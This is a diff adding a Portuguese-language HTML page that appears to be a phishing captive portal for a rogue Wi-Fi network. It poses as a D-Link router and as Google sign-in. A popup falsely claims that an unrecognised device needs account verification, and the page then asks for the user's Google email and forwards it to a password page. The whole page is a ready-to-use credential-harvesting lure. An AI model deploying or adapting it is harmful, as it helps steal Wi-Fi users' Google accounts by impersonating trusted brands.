@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>D - Link</title>
+    <link rel="stylesheet" href="google.css">
+    <style>
+      @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap');
+    </style>
+  </head>
+  <body>
+    <nav class="top-nav">
+      <h1><a href="https://www.dlink.com.br">D - Link</a></h1>
+    </nav>  
+    <div class="popup" id="popup">
+      <div class="popup-content">
+        <h2>Verificação de Conta</h2>
+        <p>Detectamos que você está tentando acessar a rede Wi-Fi em um dispositivo não reconhecido. Para garantir a segurança de sua conta, por favor, faça login abaixo para confirmar sua identidade e acessar a internet.</p>
+        <button onclick="closePopup()">Fechar</button>
+      </div>
+    </div>
+    <div class="background-image"></div>
+    <div class="login-box">
+      <img src="abc.jpg">
+      <h1>Entrar</h1>
+      <x1>Use sua Conta do Google para <br> Acessar a Internet!</x1>
+      <form action="password.html" method="GET">
+        <input type="email" id="emailInput" placeholder="Email ou Telefone" onfocus="hidePlaceholder()" onblur="restorePlaceholder()" required>
+        <x2><a href="https://accounts.google.com/signin/v2/usernamerecovery?ddm=1&dsh=S-837268099%3A1735153914391291&flowEntry=ServiceLogin&flowName=GlifWebSignIn&ifkv=AeZLP99mf2wnUIRZXvyBoDMPBag_RS8GtAzPcX2XXkDBsSQErlJik5ZdF6henyoWe7C3nHGKpvGTzw">Esqueceu o e-mail?</a></x2>
+        <small>Recurso de Verificação Wi-Fi Usando Contas Google.<br><a href="https://support.google.com/googlenest/answer/6263633?hl=pt-BR">Saiba mais</a></small>
+        <x3><a href="https://accounts.google.com/signup">Criar conta</a></x3>
+        <button type="submit">Próximo</button>
+      </form>
+    </div>
+    <script>
+      window.onload = function() {
+        document.getElementById('popup').style.display = 'flex';
+      };
+      function closePopup() {
+        document.getElementById('popup').style.display = 'none';
+      }
+      function hidePlaceholder() {
+        const inputField = document.getElementById('emailInput');
+        inputField.placeholder = '';
+      }
+      function restorePlaceholder() {
+        const inputField = document.getElementById('emailInput');
+        if (inputField.value === '') {
+          inputField.placeholder = 'Email ou Telefone';
+        }
+      }
+    </script>
+  </body>
+</html>
